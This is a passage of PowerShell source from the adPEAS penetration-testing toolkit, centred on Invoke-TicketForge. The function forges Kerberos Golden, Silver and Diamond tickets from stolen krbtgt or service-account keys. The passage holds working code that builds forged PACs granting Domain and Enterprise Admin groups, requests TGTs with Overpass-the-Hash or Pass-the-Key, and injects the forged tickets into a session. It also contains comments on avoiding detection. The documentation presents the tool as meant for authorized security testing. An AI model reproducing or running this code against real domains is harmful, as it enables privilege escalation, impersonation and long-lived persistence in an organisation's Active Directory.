        $signature = $Data[4..(4 + $sigLength - 1)]

        return [PSCustomObject]@{
            SignatureType = $signatureType
            Signature = $signature
            RODCIdentifier = if ($Data.Length -gt 4 + $sigLength + 1) {
                Read-UInt16LE -Data $Data -Offset (4 + $sigLength)
            } else { 0 }
        }
    }
    catch {
        Write-Log "[Read-PACSignature] Error parsing: $_" -Level Error
        return [PSCustomObject]@{
            SignatureType = 0
            Signature = @()
            RODCIdentifier = 0
        }
    }
}

# ============================================================================
# Exported Functions (available in combined adPEAS.ps1):
# ============================================================================
# PAC Builder: Build-PAC, Complete-PACSignatures, Build-KerbValidationInfo,
#              Build-PACClientInfo, Build-PACSignature, ConvertFrom-SIDString,
#              Get-DomainSIDFromUserSID
# PAC Parser:  Read-PAC, Read-KerbValidationInfo, Read-PACClientInfo,
#              Read-PACSignature, ConvertTo-SIDString



# ----- Invoke-TicketForge.ps1 -----

function Invoke-TicketForge {
<#
.SYNOPSIS
    Forges Kerberos tickets (Golden, Silver, Diamond) for security testing.

.DESCRIPTION
    Creates forged Kerberos tickets using captured keys from prior security assessments.
    This tool is intended for authorized penetration testing and security research.

    Supported Ticket Types:
    - Golden Ticket: Forged TGT using krbtgt key
    - Silver Ticket: Forged service ticket using service account key
    - Diamond Ticket: Modified legitimate TGT with custom PAC

    Each ticket type supports:
    - RC4-HMAC (etype 23) using NT-Hash
    - AES128-CTS (etype 17) using AES128 key
    - AES256-CTS (etype 18) using AES256 key

.PARAMETER Mode
    The type of ticket to forge:
    - Golden: Forged TGT using krbtgt key
    - Silver: Forged service ticket using service account key
    - Diamond: Modified legitimate TGT (requires existing TGT + krbtgt key)

.PARAMETER UserName
    The sAMAccountName of the user to impersonate.
    Default: "Administrator"

.PARAMETER Domain
    The domain name (FQDN format, e.g., "contoso.com").
    If not specified, uses the domain from the current adPEAS session (Connect-adPEAS).
    For Diamond tickets, extracted from the base TGT if not provided.

.PARAMETER Server
    Domain Controller for Kerberos operations (optional).
    Used for Diamond Ticket TGT requests when using -BaseUserCredential.

.PARAMETER DomainSID
    The domain SID string (e.g., "S-1-5-21-xxx-xxx-xxx").
    Required for Golden/Silver tickets unless an active adPEAS session exists.
    For Diamond tickets, extracted from the base TGT's PAC if not provided.

.PARAMETER UserRID
    The RID of the user being impersonated.
    For Golden/Silver: Default 500 (built-in Administrator).
    For Diamond: If not specified, uses the RID from the original TGT (OPSEC mode).

.PARAMETER NTHash
    The NT-Hash for ticket encryption (32 hex characters).
    - Golden/Diamond Ticket: krbtgt NT-Hash
    - Silver Ticket: Service account NT-Hash
    Uses RC4-HMAC encryption (etype 23).

.PARAMETER AES256Key
    The AES256 key for ticket encryption (64 hex characters).
    - Golden/Diamond Ticket: krbtgt AES256 key
    - Silver Ticket: Service account AES256 key
    Uses AES256-CTS-HMAC-SHA1-96 encryption (etype 18).

.PARAMETER AES128Key
    The AES128 key for ticket encryption (32 hex characters).
    - Golden/Diamond Ticket: krbtgt AES128 key
    - Silver Ticket: Service account AES128 key
    Uses AES128-CTS-HMAC-SHA1-96 encryption (etype 17).

.PARAMETER GroupRIDs
    Array of group RIDs to include in the PAC's GroupIds field.

    Golden/Silver: Default @(512, 513, 518, 519, 520) - Domain Admins, Domain Users,
    Schema Admins, Enterprise Admins, Group Policy Creator Owners. Specifying this
    parameter REPLACES the entire default list (e.g. @(512, 513, 518, 519, 520, 1337)
    to keep the defaults and add a custom one).

    Diamond: These RIDs are APPENDED to the user's real group memberships (parsed from
    the genuine PAC), not used as a replacement. If not specified, only Domain Admins
    (512) is injected - the broader default set is itself a detection indicator and is
    therefore avoided for diamond tickets.

.PARAMETER ExtraSIDs
    Array of additional full SIDs to include in the PAC's ExtraSids field.
    Used for cross-domain trust abuse or special group membership.
    Default: empty array. Specifying this parameter REPLACES the default (empty) list.
    Example: @("S-1-18-1") for Authentication Authority Asserted Identity.
    Example: @("S-1-5-21-<TrustedDomainSID>-519") for cross-forest Enterprise Admins.

.PARAMETER ServicePrincipalName
    For Silver Tickets: The SPN of the target service (e.g., "cifs/server.domain.com").

.PARAMETER ServiceType
    For Silver Tickets: Shortcut for common service types.
    Options: CIFS, HTTP, LDAP, HOST, MSSQL, WSMAN

.PARAMETER TargetComputer
    For Silver Tickets: The target computer name (used with -ServiceType).

.PARAMETER ValidityDays
    Number of days the ticket should be valid.
    Default: 3650 (10 years) for Golden/Silver.
    Note: Diamond Tickets preserve the original TGT timestamps and ignore this parameter.

.PARAMETER OutputKirbi
    Path to save the forged ticket as a .kirbi file.

.PARAMETER PTT
    Immediately imports the forged ticket into the current Windows session.
    Equivalent to running Import-KerberosTicket after ticket creation.

.PARAMETER BaseUserTGT
    For Diamond Tickets: Base64-encoded legitimate TGT to modify.

.PARAMETER BaseUserTGTPath
    For Diamond Tickets: Path to .kirbi file containing legitimate TGT.

.PARAMETER BaseUserCredential
    For Diamond Tickets: PSCredential of the user whose TGT to request and modify.
    This allows realtime TGT acquisition from the domain.

.PARAMETER BaseUserName
    For Diamond Tickets: sAMAccountName of the base user when using -BaseUserNTHash or -BaseUserAES256Key.
    Required when using hash/key-based authentication (the hash/key belongs to this user).
    Not needed with -BaseUserCredential (extracted from credential) or -BaseUserTGT/-BaseUserTGTPath (extracted from ticket).

.PARAMETER BaseUserNTHash
    For Diamond Tickets: NT-Hash of the base user for Overpass-the-Hash TGT request.
    Requires -BaseUserName to specify which user the hash belongs to.

.PARAMETER BaseUserAES256Key
    For Diamond Tickets: AES256 key of the base user for Pass-the-Key TGT request.
    Requires -BaseUserName to specify which user the key belongs to.

.EXAMPLE
    # Golden Ticket with active adPEAS session (DomainSID from session)
    # Uses defaults: UserName=Administrator, Domain/DomainSID from session
    Connect-adPEAS -Domain "contoso.com" -Credential (Get-Credential)
    Invoke-TicketForge -Mode Golden -AES256Key "52a4126c7ab14fe..." -PTT

.EXAMPLE
    # Golden Ticket with explicit DomainSID (no session required)
    Invoke-TicketForge -Mode Golden -Domain "contoso.com" `
        -DomainSID "S-1-5-21-1234567890-1234567890-1234567890" `
        -AES256Key "52a4126c7ab14fe..." -PTT

.EXAMPLE
    # Golden Ticket with NT-Hash and custom user
    Invoke-TicketForge -Mode Golden -UserName "svc_backup" -Domain "contoso.com" `
        -DomainSID "S-1-5-21-1234567890-1234567890-1234567890" `
        -NTHash "32ED87BDB5FDC5E9CBA88547376818D4" `
        -OutputKirbi "golden.kirbi"

.EXAMPLE
    # Silver Ticket for CIFS service
    Invoke-TicketForge -Mode Silver -UserName "administrator" -Domain "contoso.com" `
        -DomainSID "S-1-5-21-xxx" -ServiceType CIFS -TargetComputer "fileserver" `
        -NTHash "ABC123..." -OutputKirbi "silver_cifs.kirbi"

.EXAMPLE
    # Silver Ticket with explicit SPN
    Invoke-TicketForge -Mode Silver -UserName "admin" -Domain "contoso.com" `
        -DomainSID "S-1-5-21-xxx" -ServicePrincipalName "MSSQLSvc/sql01.contoso.com:1433" `
        -AES256Key "..." -OutputKirbi "silver_sql.kirbi"

.EXAMPLE
    # Diamond Ticket with realtime TGT acquisition (using password)
    Invoke-TicketForge -Mode Diamond -Domain "contoso.com" `
        -BaseUserCredential (Get-Credential "lowpriv") `
        -AES256Key "KRBTGT_AES256KEY" `
        -GroupRIDs @(512, 519) -OutputKirbi "diamond.kirbi"

.EXAMPLE
    # Diamond Ticket with .kirbi file
    Invoke-TicketForge -Mode Diamond -BaseUserTGTPath ".\user_tgt.kirbi" `
        -AES256Key "KRBTGT_AES256KEY" -GroupRIDs @(512) -PTT

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet('Golden', 'Silver', 'Diamond')]
        [string]$Mode,

        [Parameter(Mandatory = $false)]
        [string]$UserName = "Administrator",

        [Parameter(Mandatory = $false)]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [string]$Server,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^S-1-5-21-\d+-\d+-\d+$')]
        [string]$DomainSID,

        [Parameter(Mandatory = $false)]
        [uint32]$UserRID,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$NTHash,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{64}$')]
        [string]$AES256Key,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$AES128Key,

        [Parameter(Mandatory = $false)]
        [uint32[]]$GroupRIDs = @(512, 513, 518, 519, 520),

        [Parameter(Mandatory = $false)]
        [ValidateScript({ $_ | ForEach-Object { $_ -match '^S-1-' } | Where-Object { -not $_ } | ForEach-Object { throw "Invalid SID format" }; $true })]
        [string[]]$ExtraSIDs = @(),

        # Silver Ticket specific
        [Parameter(Mandatory = $false)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory = $false)]
        [ValidateSet('CIFS', 'HTTP', 'LDAP', 'HOST', 'MSSQL', 'WSMAN')]
        [string]$ServiceType,

        [Parameter(Mandatory = $false)]
        [string]$TargetComputer,

        [Parameter(Mandatory = $false)]
        [int]$ValidityDays,

        [Parameter(Mandatory = $false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory = $false)]
        [switch]$PTT,

        # Diamond Ticket specific - existing TGT sources
        [Parameter(Mandatory = $false)]
        [string]$BaseUserTGT,

        [Parameter(Mandatory = $false)]
        [string]$BaseUserTGTPath,

        # Diamond Ticket specific - realtime TGT acquisition
        [Parameter(Mandatory = $false)]
        [System.Management.Automation.PSCredential]$BaseUserCredential,

        [Parameter(Mandatory = $false)]
        [string]$BaseUserName,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$BaseUserNTHash,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{64}$')]
        [string]$BaseUserAES256Key
    )

    try {
        # Validate key is provided
        if (-not $NTHash -and -not $AES256Key -and -not $AES128Key) {
            throw "You must provide one of: -NTHash, -AES256Key, or -AES128Key"
        }

        # Validate BaseUserName is provided when using hash/key-based authentication
        if (($BaseUserNTHash -or $BaseUserAES256Key) -and -not $BaseUserName) {
            throw "When using -BaseUserNTHash or -BaseUserAES256Key, you must also provide -BaseUserName to specify which user the hash/key belongs to."
        }

        # Auto-detect Domain from existing adPEAS session if not provided
        # Diamond Tickets with file/base64 TGT can extract Domain from the ticket itself
        $diamondWithExistingTGT = ($Mode -eq 'Diamond' -and ($BaseUserTGTPath -or $BaseUserTGT))
        if (-not $Domain) {
            if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
                $Domain = $Script:LDAPContext.Domain
                Write-Log "[Invoke-TicketForge] Using domain from active session: $Domain"
            }
            elseif ($diamondWithExistingTGT) {
                Write-Log "[Invoke-TicketForge] Diamond Ticket: Domain will be extracted from base TGT"
            }
            else {
                throw "No -Domain specified and no active adPEAS session found. Use Connect-adPEAS first or provide -Domain explicitly."
            }
        }

        # Auto-detect Server from existing session if not provided
        if (-not $Server -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
            $Server = $Script:LDAPContext.Server
            Write-Log "[Invoke-TicketForge] Using server from active session: $Server"
        }

        Write-Log "[Invoke-TicketForge] Starting $Mode Ticket creation for $UserName@$Domain"

        # Determine encryption type and key
        $encryptionType = 0
        $key = $null

        if ($AES256Key) {
            $encryptionType = 18  # AES256-CTS-HMAC-SHA1-96
            $key = ConvertFrom-HexStringToBytes -HexString $AES256Key
            Write-Log "[Invoke-TicketForge] Using AES256-CTS (etype 18)"
        }
        elseif ($AES128Key) {
            $encryptionType = 17  # AES128-CTS-HMAC-SHA1-96
            $key = ConvertFrom-HexStringToBytes -HexString $AES128Key
            Write-Log "[Invoke-TicketForge] Using AES128-CTS (etype 17)"
        }
        elseif ($NTHash) {
            $encryptionType = 23  # RC4-HMAC
            $key = ConvertFrom-HexStringToBytes -HexString $NTHash
            Write-Log "[Invoke-TicketForge] Using RC4-HMAC (etype 23)"
        }

        # Resolve DomainSID if not provided
        # Priority: 1) Explicit parameter, 2) Active adPEAS session, 3) Error for Golden/Silver
        # Diamond Tickets can extract DomainSID from the base TGT's PAC
        if (-not $DomainSID -and $Mode -ne 'Diamond') {
            # Try to get DomainSID from active adPEAS session
            if ($Script:LDAPContext -and $Script:LDAPContext.DomainSID) {
                $DomainSID = $Script:LDAPContext.DomainSID
                Write-Log "[Invoke-TicketForge] Using DomainSID from active adPEAS session: $DomainSID"
            }
            else {
                throw "DomainSID is required for $Mode Tickets. Either provide -DomainSID parameter or establish an adPEAS session first with Connect-adPEAS."
            }
        }
        elseif (-not $DomainSID -and $Mode -eq 'Diamond') {
            Write-Log "[Invoke-TicketForge] Diamond Ticket: DomainSID will be extracted from base TGT's PAC"
        }

        # Set ValidityDays default for Golden/Silver (Diamond uses original TGT timestamps)
        if (-not $ValidityDays -and $Mode -ne 'Diamond') {
            $ValidityDays = 3650
        }

        # Set default kvno values - no LDAP lookup needed
        # Set internal kvno values (not user-configurable)
        # Note: KDC does NOT validate kvno, it only uses it for key selection during decryption
        $kvno = switch ($Mode) {
            'Golden' { 2 }   # Default krbtgt kvno
            'Silver' { 1 }   # Default service account kvno
            'Diamond' { 0 }  # Will be extracted from base TGT
        }

        # For Golden/Silver: Default UserRID to 500 if not specified
        $effectiveUserRID = if ($PSBoundParameters.ContainsKey('UserRID')) { $UserRID } else { 500 }

        # Diamond Ticket group default: when the caller did NOT explicitly request groups,
        # inject ONLY Domain Admins (512) instead of the well-known 5-group set
        # (512/513/518/519/520). For a recut diamond these get APPENDED to the user's real
        # memberships, so the synthetic block that the broader default would add is itself
        # a documented IOC. Golden/Silver keep the full default set (they have no real PAC).
        if ($Mode -eq 'Diamond' -and -not $PSBoundParameters.ContainsKey('GroupRIDs')) {
            $GroupRIDs = @(512)
            Write-Log "[Invoke-TicketForge] Diamond: no -GroupRIDs specified, injecting Domain Admins (512) only"
        }

        # Dispatch to appropriate handler
        $result = switch ($Mode) {
            'Golden' {
                New-GoldenTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
                    -UserRID $effectiveUserRID -Key $key -EncryptionType $encryptionType `
                    -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                    -ValidityDays $ValidityDays `
                    -Kvno $kvno -OutputKirbi $OutputKirbi
            }
            'Silver' {
                # Build SPN if not explicit
                $spn = $ServicePrincipalName
                if (-not $spn -and $ServiceType -and $TargetComputer) {
                    $targetFQDN = if ($TargetComputer -like "*.*") { $TargetComputer } else { "$TargetComputer.$Domain" }
                    $spn = switch ($ServiceType) {
                        'CIFS' { "cifs/$targetFQDN" }
                        'HTTP' { "http/$targetFQDN" }
                        'LDAP' { "ldap/$targetFQDN" }
                        'HOST' { "host/$targetFQDN" }
                        'MSSQL' { "MSSQLSvc/$targetFQDN" }
                        'WSMAN' { "wsman/$targetFQDN" }
                    }
                }

                if (-not $spn) {
                    throw "Silver Ticket requires -ServicePrincipalName or both -ServiceType and -TargetComputer"
                }

                New-SilverTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
                    -UserRID $effectiveUserRID -Key $key -EncryptionType $encryptionType `
                    -ServicePrincipalName $spn -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                    -ValidityDays $ValidityDays `
                    -Kvno $kvno -OutputKirbi $OutputKirbi
            }
            'Diamond' {
                # Diamond Ticket requires a base TGT - either from file/base64 or realtime acquisition
                $baseTgtBytes = $null
                $tgtResult = $null

                # Option 1: Load from file
                if ($BaseUserTGTPath) {
                    if (-not (Test-Path $BaseUserTGTPath)) {
                        throw "Base TGT file not found: $BaseUserTGTPath"
                    }
                    # Resolve to a full filesystem path: [IO.File]::ReadAllBytes uses
                    # Environment.CurrentDirectory, not PowerShell's $PWD.
                    $resolvedTgtPath = (Resolve-Path -LiteralPath $BaseUserTGTPath -ErrorAction Stop).ProviderPath
                    $baseTgtBytes = [System.IO.File]::ReadAllBytes($resolvedTgtPath)
                    Write-Log "[Invoke-TicketForge] Loaded base TGT from file: $BaseUserTGTPath"
                }
                # Option 2: Base64 string
                elseif ($BaseUserTGT) {
                    $baseTgtBytes = [Convert]::FromBase64String($BaseUserTGT)
                    Write-Log "[Invoke-TicketForge] Loaded base TGT from Base64 string"
                }
                # Options 3-5: Realtime TGT acquisition via Kerberos
                elseif ($BaseUserCredential -or $BaseUserNTHash -or $BaseUserAES256Key) {
                    # Determine username and auth params for Invoke-KerberosAuth
                    $authParams = @{
                        Domain = $Domain
                        DomainController = $Server
                    }

                    if ($BaseUserCredential) {
                        $resolvedBaseUserName = $BaseUserCredential.UserName
                        if ($resolvedBaseUserName -match '\\') { $resolvedBaseUserName = $resolvedBaseUserName.Split('\')[1] }
                        if ($resolvedBaseUserName -match '@') { $resolvedBaseUserName = $resolvedBaseUserName.Split('@')[0] }
                        $authParams.UserName = $resolvedBaseUserName
                        $authParams.Credential = $BaseUserCredential
                        $authMethod = "Credential"
                    }
                    elseif ($BaseUserNTHash) {
                        $authParams.UserName = $BaseUserName
                        $authParams.NTHash = $BaseUserNTHash
                        $authMethod = "Overpass-the-Hash"
                    }
                    else {
                        $authParams.UserName = $BaseUserName
                        $authParams.AES256Key = $BaseUserAES256Key
                        $authMethod = "Pass-the-Key (AES256)"
                    }

                    Write-Log "[Invoke-TicketForge] Requesting realtime TGT via $authMethod for $($authParams.UserName)..."
                    $tgtResult = Invoke-KerberosAuth @authParams

                    if (-not $tgtResult -or -not $tgtResult.Success) {
                        throw "Failed to acquire TGT via ${authMethod}: $($tgtResult.Error)"
                    }

                    # Build KRB-CRED from raw ticket bytes
                    $baseTgtBytes = Build-KRBCred -Ticket $tgtResult.TicketBytes `
                        -SessionKey $tgtResult.SessionKeyBytes `
                        -SessionKeyType $tgtResult.EncryptionType `
                        -Realm $Domain.ToUpper() `
                        -ClientName $authParams.UserName `
                        -AuthTime $tgtResult.AuthTime `
                        -StartTime $tgtResult.StartTime `
                        -EndTime $tgtResult.EndTime `
                        -RenewTill $tgtResult.RenewTill
                    Write-Log "[Invoke-TicketForge] Acquired TGT for $($authParams.UserName) via $authMethod (etype $($tgtResult.EncryptionType))"
                }
                else {
                    throw "Diamond Ticket requires one of: -BaseUserTGT, -BaseUserTGTPath, -BaseUserCredential, or -BaseUserName with -BaseUserNTHash/-BaseUserAES256Key"
                }

                # OPSEC Decision: For Diamond Tickets, preserve original TGT user by default.
                # Only impersonate if -UserName was EXPLICITLY provided by the user.
                $impersonateUser = $PSBoundParameters.ContainsKey('UserName')

                if ($impersonateUser) {
                    Write-Log "[Invoke-TicketForge] Diamond Ticket: Impersonating $UserName (RID $effectiveUserRID)"
                    New-DiamondTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
                        -UserRID $effectiveUserRID -Key $key -EncryptionType $encryptionType `
                        -BaseUserTGT $baseTgtBytes -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                        -Kvno $kvno -OutputKirbi $OutputKirbi
                } else {
                    # No explicit -UserName, preserve original TGT user (OPSEC default)
                    # Pass $null for UserName and UserRID=0 to let New-DiamondTicket extract from TGT
                    Write-Log "[Invoke-TicketForge] Diamond Ticket: Preserving original TGT user (OPSEC mode)"
                    New-DiamondTicket -Domain $Domain -DomainSID $DomainSID `
                        -Key $key -EncryptionType $encryptionType `
                        -BaseUserTGT $baseTgtBytes -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                        -Kvno $kvno -OutputKirbi $OutputKirbi
                }
            }
        }

        # Pass-the-Ticket: Import the forged ticket into current session
        # Use the pre-built KRB-CRED (KirbiBytes) which was created by Build-KRBCred
        # with all correct metadata already embedded. This avoids any potential
        # issues from rebuilding the KRB-CRED in Import-KerberosTicket.
        if ($PTT -and $result -and $result.Success -and $result.KirbiBytes) {
            Write-Log "[Invoke-TicketForge] Importing ticket into current session (Pass-the-Ticket)..."
            Write-Log "[Invoke-TicketForge] Using pre-built KRB-CRED ($($result.KirbiBytes.Length) bytes)"

            # Import using pre-built KRB-CRED directly (already has all metadata embedded)
            $pttResult = Import-KerberosTicket -TicketBytes $result.KirbiBytes

            if ($pttResult -and $pttResult.Success) {
                Write-Log "[Invoke-TicketForge] Ticket imported successfully"
                $result | Add-Member -NotePropertyName 'PassTheTicket' -NotePropertyValue $true -Force
                $result | Add-Member -NotePropertyName 'PTTResult' -NotePropertyValue $pttResult -Force
                $result.Message = "$($result.Message) - Ticket imported into session"

                # KDC-locator sanity check: the ticket is now in the LSA cache, but Windows
                # tools (net view, klist get, PsExec, ...) must locate a KDC for the ticket's
                # realm to perform the TGS-REQ. On a machine that is NOT joined to that realm,
                # this requires resolvable Kerberos SRV records (or a ksetup KDC mapping).
                # If neither is present the ticket is valid but unusable via the Windows stack,
                # failing with SEC_E_NO_LOGON_SERVERS (0xc000005e) - which looks like a bad
                # ticket but is purely name resolution. Warn proactively so it is not mistaken
                # for a forging error.
                if (-not (Test-RealmKDCLocatable -Realm $result.Domain)) {
                    Write-Warning ("[Invoke-TicketForge] Ticket imported, but Windows cannot locate a KDC for realm '$($result.Domain)' " +
                        "(this host is not joined to it and no '_kerberos._tcp.$($result.Domain.ToLower())' SRV record resolves).")
                    Write-Warning "[Invoke-TicketForge] Windows tools (net view, klist get, PsExec) will fail with 'no logon servers' (0xc000005e) until the realm is resolvable. The ticket itself is valid."
                    Write-Warning "[Invoke-TicketForge] Fix on THIS host (elevated): Add-DnsClientNrptRule -Namespace '.$($result.Domain.ToLower())' -NameServers '<DC-IP>'   (alternatively: ksetup /addkdc $($result.Domain) <dc.fqdn> + reboot)"
                    Write-Log "[Invoke-TicketForge] KDC locator warning emitted for realm '$($result.Domain)'"
                }
            }
            else {
                Write-Log "[Invoke-TicketForge] Failed to import ticket: $($pttResult.Error)" -Level Warning
                $result | Add-Member -NotePropertyName 'PassTheTicket' -NotePropertyValue $false -Force
                $result | Add-Member -NotePropertyName 'PTTError' -NotePropertyValue $pttResult.Error -Force
                $result.Message = "$($result.Message) - PTT failed: $($pttResult.Error)"
            }
        }

        return $result
    }
    catch {
        Write-Log "[Invoke-TicketForge] Error: $_" -Level Error
        return [PSCustomObject]@{
            Success = $false
            Mode = $Mode
            UserName = $UserName
            Domain = $Domain
            Error = $_.Exception.Message
            Message = "$Mode Ticket creation failed: $($_.Exception.Message)"
        }
    }
}

#region Helper: Hex to Byte Array Conversion

function ConvertFrom-HexStringToBytes {
    <#
    .SYNOPSIS
        Converts a hexadecimal string to a byte array.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$HexString
    )

    $length = $HexString.Length / 2
    $bytes = [byte[]]::new($length)
    for ($i = 0; $i -lt $length; $i++) {
        $bytes[$i] = [Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
    }
    return $bytes
}

#endregion

#region Helper: KDC Locator Check (Pass-the-Ticket usability)

function Test-RealmKDCLocatable {
    <#
    .SYNOPSIS
        Heuristically checks whether the Windows Kerberos stack can locate a KDC
        for the given realm - i.e. whether a Pass-the-Ticket'd ticket will actually
        be usable by Windows tools (which need a TGS-REQ).

    .DESCRIPTION
        A forged ticket can be imported into the LSA cache regardless of connectivity,
        but using it (net view, klist get, PsExec, ...) requires Windows to find a KDC
        for the ticket's realm. This succeeds when:
          - the host is joined to that same realm, OR
          - the realm's Kerberos SRV record (_kerberos._tcp.<realm>) is resolvable
            (e.g. via DNS, a conditional forwarder, or a client-local NRPT rule).
        Returns $true if locatable (or undeterminable - we do not warn on doubt),
        $false only when we are confident Windows will fail with NO_LOGON_SERVERS.

    .PARAMETER Realm
        The Kerberos realm (ticket domain), e.g. "CONTOSO.COM".
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$Realm
    )

    if ([string]::IsNullOrWhiteSpace($Realm)) { return $true }
    $realmLower = $Realm.ToLowerInvariant()

    # Joined to the same realm -> the LSA can always locate the KDC.
    $machineDomain = $env:USERDNSDOMAIN
    if ($machineDomain -and ($machineDomain.ToLowerInvariant() -eq $realmLower)) {
        return $true
    }

    # Cross-realm: does the Kerberos SRV record resolve via the system resolver
    # (this path honors NRPT rules and conditional forwarders, mirroring the LSA)?
    try {
        $srv = Resolve-SrvRecord -Name "_kerberos._tcp.$realmLower" -ErrorAction SilentlyContinue
        if ($srv) { return $true }
    }
    catch {
        # Resolver unavailable -> cannot prove failure, do not warn.
        Write-Log "[Test-RealmKDCLocatable] SRV lookup error for '$realmLower': $_" -Level Debug
        return $true
    }

    return $false
}

#endregion

#region Golden Ticket Implementation

function New-GoldenTicket {
    [CmdletBinding()]
    param(
        [string]$UserName,
        [string]$Domain,
        [string]$DomainSID,
        [uint32]$UserRID,
        [byte[]]$Key,
        [int]$EncryptionType,
        [uint32[]]$GroupRIDs,
        [string[]]$ExtraSIDs,
        [int]$ValidityDays,
        [int]$Kvno,
        [string]$OutputKirbi
    )

    Write-Log "[New-GoldenTicket] Building Golden Ticket..."

    # Generate random session key with proper resource disposal
    $sessionKeyLength = if ($EncryptionType -eq 18) { 32 } else { 16 }
    $sessionKey = [byte[]]::new($sessionKeyLength)
    $rng = $null
    try {
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($sessionKey)
    } finally {
        if ($rng) { $rng.Dispose() }
    }

    # Calculate times (RenewTill = EndTime for simplicity, matches Rubeus behavior)
    $now = [datetime]::UtcNow
    $authTime = $now
    $startTime = $now
    $endTime = $now.AddDays($ValidityDays)
    $renewTill = $endTime

    # Parse domain info
    # Realm and client realm = UPPERCASE
    # SPN service instance (krbtgt/domain) = lowercase (Rubeus compatibility)
    $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
    $domainFQDN = $Domain.ToUpper()
    $domainLower = $Domain.ToLower()

    Write-Log "[New-GoldenTicket] Domain: $domainFQDN, SID: $DomainSID"
    Write-Log "[New-GoldenTicket] User: $UserName (RID: $UserRID), Groups: $($GroupRIDs -join ', ')"

    # Build PAC
    Write-Log "[New-GoldenTicket] Building PAC..."
    # AuthTime is used for CLIENT_INFO.ClientId and MUST match EncTicketPart.authtime
    $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
        -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
        -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
        -EncryptionType $EncryptionType -LogonTime $authTime -AuthTime $authTime

    $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
        -ServerChecksumOffset $pacResult.ServerChecksumOffset `
        -KDCChecksumOffset $pacResult.KDCChecksumOffset `
        -Key $Key -EncryptionType $EncryptionType

    Write-Log "[New-GoldenTicket] PAC: $($pacData.Length) bytes"

    # Build EncTicketPart
    $ticketFlags = New-TicketFlags -Forwardable -Renewable -Initial -PreAuthent

    $encTicketPart = New-EncTicketPart -SessionKey $sessionKey -SessionKeyType $EncryptionType `
        -ClientRealm $domainFQDN -ClientName $UserName `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -PACData $pacData -TicketFlags $ticketFlags

    # Encrypt EncTicketPart using Windows native crypto (same as Rubeus)
    $keyUsage = 2
    $encryptedTicketPart = Protect-KerberosNative -Key $Key -Data $encTicketPart `
        -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Build Ticket
    # Note: ServerInstance should be lowercase like Rubeus (krbtgt/contoso.com not krbtgt/CONTOSO.COM)
    $ticket = New-KerberosTicket -Realm $domainFQDN -ServerName "krbtgt" `
        -ServerInstance $domainLower -EncryptedPart $encryptedTicketPart `
        -EncryptionType $EncryptionType -Kvno $kvno

    # Build KRB-CRED
    $krbCred = Build-KRBCred -Ticket $ticket -SessionKey $sessionKey `
        -SessionKeyType $EncryptionType -Realm $domainFQDN -ClientName $UserName `
        -ServerName "krbtgt" -ServerInstance $domainLower `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -TicketFlags $ticketFlags

    # Save if requested
    $outputPath = $null
    if ($OutputKirbi) {
        $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
        [System.IO.File]::WriteAllBytes($outputPath, $krbCred)
        Write-Log "[New-GoldenTicket] Saved to: $outputPath"
    }

    return [PSCustomObject]@{
        Success = $true
        Mode = 'Golden'
        UserName = $UserName
        Domain = $domainFQDN
        DomainSID = $DomainSID
        UserRID = $UserRID
        GroupRIDs = $GroupRIDs
        ExtraSIDs = $ExtraSIDs
        EncryptionType = $EncryptionType
        EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
        Kvno = $Kvno
        AuthTime = $authTime
        StartTime = $startTime
        EndTime = $endTime
        RenewTill = $renewTill
        TicketBytes = $ticket
        KirbiBytes = $krbCred
        SessionKey = $sessionKey
        SessionKeyBase64 = [Convert]::ToBase64String($sessionKey)
        KirbiBase64 = [Convert]::ToBase64String($krbCred)
        OutputPath = $outputPath
        Message = "Golden Ticket created successfully"
    }
}

#endregion

#region Silver Ticket Implementation

function New-SilverTicket {
    [CmdletBinding()]
    param(
        [string]$UserName,
        [string]$Domain,
        [string]$DomainSID,
        [uint32]$UserRID,
        [byte[]]$Key,
        [int]$EncryptionType,
        [string]$ServicePrincipalName,
        [uint32[]]$GroupRIDs,
        [string[]]$ExtraSIDs,
        [int]$ValidityDays,
        [int]$Kvno,
        [string]$OutputKirbi
    )

    Write-Log "[New-SilverTicket] Building Silver Ticket for $ServicePrincipalName..."

    # Parse SPN
    $spnParts = $ServicePrincipalName -split '/'
    if ($spnParts.Count -lt 2) {
        throw "Invalid SPN format. Expected: service/host or service/host:port"
    }
    $serviceName = $spnParts[0]
